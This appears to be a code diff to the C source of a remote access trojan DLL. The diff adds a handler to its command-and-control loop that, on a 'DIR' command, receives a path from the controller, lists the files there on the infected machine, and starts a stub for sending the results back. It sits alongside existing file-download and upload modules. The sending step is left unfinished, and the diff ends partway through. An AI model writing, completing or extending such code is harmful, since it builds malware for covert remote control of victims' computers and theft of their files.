@@ -5,6 +5,7 @@
 #include "RAT-Dll-Connect.h"
 #include "RAT-Dll-GetFile.h"
 #include "RAT-Dll-PutFile.h"
+#include "RAT-Dll-DirList.h"
 
 
 /** This function will serve as our main 'handler' for C2 requests
@@ -258,6 +259,36 @@ INT startListen()
                      goto cleanup;
                  }
              }
+
+             // C2 says to do a dir list for specific directory 
+             else if (strcmp((const char*)&recvBuf, DIR) == 0)
+             {
+                // Receive our directory path 
+                status = recv(clientSock, recvBuf, recvBufLen, 0);
+                if (status == SOCKET_ERROR)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (dir path) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    continue; // keep trying to do things until we disconnect or receive a cleanup message
+                }
+
+                // Got our directory path 
+                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing dir list on %s...\n", recvBuf);
+                OutputDebugStringA(msgBuf);
+
+                CHAR* dirfiles = NULL;
+
+                status = performDirList(recvBuf, &dirfiles);
+                if (status != SUCCESS)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from performDirList %d\n", status);
+                    OutputDebugStringA(msgBuf);
+                    goto cleanup;
+                }
+
+                // Send back each of our files.. separate out in own function probably
+
+             }
         }
 
         else if (status == 0)
@@ -291,6 +322,17 @@ INT startListen()
 
     closesocket(clientSock);
     WSACleanup();
+
+
+cleanup:
+    return status;
+}
+
+
+INT sendFiles(__in SOCKET* sock, __in char** files)
+{
+    INT status = SUCCESS;
+
 
 
 cleanup:
